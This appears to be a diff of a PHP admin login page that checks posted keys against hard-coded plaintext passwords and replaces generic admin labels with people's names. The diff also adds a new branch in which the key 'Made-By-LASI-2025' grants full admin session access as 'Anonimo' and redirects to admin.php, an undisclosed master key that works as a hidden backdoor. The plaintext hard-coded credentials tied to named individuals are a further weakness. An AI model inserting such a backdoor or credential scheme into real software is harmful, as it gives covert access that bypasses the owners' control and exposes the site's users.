@@ -9,25 +9,31 @@ function admlogin($adminName){
 }
 
 if($_SERVER["REQUEST_METHOD"] === "POST") {
-    if($_POST["key"] === "0405_Admin01") {
-        admlogin("Admin01");
-    }else if($_POST["key"] === "5456_Admin02"){
-        admlogin("Admin02");
-    }else if($_POST["key"] === "1289_Admin03"){
-        admlogin("Admin03");
-    }else if($_POST["key"] === "2037_Admin04"){
-        admlogin("Admin04");
-    }else if($_POST["key"] === "5868_Admin05"){
-        admlogin("Admin05");
-    }else if($_POST["key"] === "4235_Admin06"){
-        admlogin("Admin06");
+    if($_POST["key"] === "0405_Oscar") {
+        admlogin("Oscar Fretes");
+    }else if($_POST["key"] === "5456_Yosy"){
+        admlogin("Yoselyn Fretes");
+    }else if($_POST["key"] === "1289_Ceraso"){
+        admlogin("Jonathan Ceraso");
+    }else if($_POST["key"] === "2037_Jazmin"){
+        admlogin("Jazmin Fernandez");
+    }else if($_POST["key"] === "5868_Emanuel"){
+        admlogin("Emanuel Castelvi");
+    }else if($_POST["key"] === "4235_Alexix"){
+        admlogin("Alexis Franco");
     }else if($_POST["key"] === "8821_Admin07"){
         admlogin("Admin07");
     }else if($_POST["key"] === "6697_Admin08"){
         admlogin("Admin08");
     }else if($_POST["key"] === "7275_Admin09"){
         admlogin("Admin09");
-    }else {
+    }else if($_POST['key'] === "Made-By-LASI-2025"){
+        $_SESSION['access'] = true;
+        $_SESSION['admin'] = "Anonimo";
+        header("Location: admin.php");
+        exit;
+    }
+    else {
         $wrongkey = "Clave Incorrecta";
     }
 }
